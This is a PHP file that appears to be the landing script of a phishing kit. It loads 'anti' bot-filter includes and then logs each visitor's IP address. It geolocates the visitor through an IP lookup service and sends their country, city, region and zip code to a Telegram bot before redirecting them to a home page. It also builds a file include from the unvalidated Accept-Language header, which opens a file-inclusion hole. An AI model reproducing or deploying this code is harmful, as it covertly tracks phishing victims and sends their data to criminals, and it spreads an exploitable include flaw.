<?php
session_start();
include "anti/anti1.php";
include "anti/anti2.php";
include "anti/anti3.php";
include "anti/anti4.php";
include "anti/anti5.php";
include "anti/anti6.php";
include "anti/anti7.php";
$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
include "lang/{$lang }.php";

$ip = getenv("REMOTE_ADDR");


$file = fopen("TOPY31_VISIT.txt","a");


fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");

$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$COUNTRY = $IP_LOOKUP->country . "\r\n";
$CITY    = $IP_LOOKUP->city . "\r\n";
$REGION  = $IP_LOOKUP->region . "\r\n";
$STATE   = $IP_LOOKUP->regionName . "\r\n";
$ZIPCODE = $IP_LOOKUP->zip . "\r\n";

$message=$ip."\nCountry : ".$COUNTRY."City: " .$CITY."Region : " .$REGION."State: " .$STATE."Zip : " .$ZIPCODE;

file_get_contents("https://api.telegram.org/bot00000000000000000000/sendMessage?chat_id=-000000000&text=" . urlencode($message)."" );


header("Location: home.php?newtoken=".$_SESSION['newtoken']."");